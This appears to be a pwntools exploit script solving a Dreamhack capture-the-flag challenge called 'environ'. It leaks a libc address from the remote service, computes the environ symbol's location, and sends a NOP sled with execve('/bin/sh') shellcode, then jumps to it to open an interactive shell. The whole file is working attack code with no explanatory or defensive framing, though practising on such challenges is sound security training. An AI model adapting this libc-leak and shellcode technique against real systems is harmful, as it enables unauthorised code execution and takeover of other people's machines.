from pwn import *

context.arch = "x86_64"

port = 20828
rem = remote("host3.dreamhack.games", port)

lib = ELF("./Pwnable/environ/problem/libc.so.6")

rem.recvuntil(b'stdout: 0x')
stdout_addr = int(rem.recvn(12).decode(), 16)
lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
environ_addr = lib_base + lib.symbols['environ']

shellcode = shellcraft.execve("/bin/sh", 0, 0)

# nop sled
payload = b'\x90' * (0x750)
payload += asm(shellcode)

rem.sendlineafter(b'Size: ', str(len(payload)).encode())
rem.sendlineafter(b'Data: ', payload)
rem.sendlineafter(b'jmp=', str(environ_addr).encode())

rem.interactive()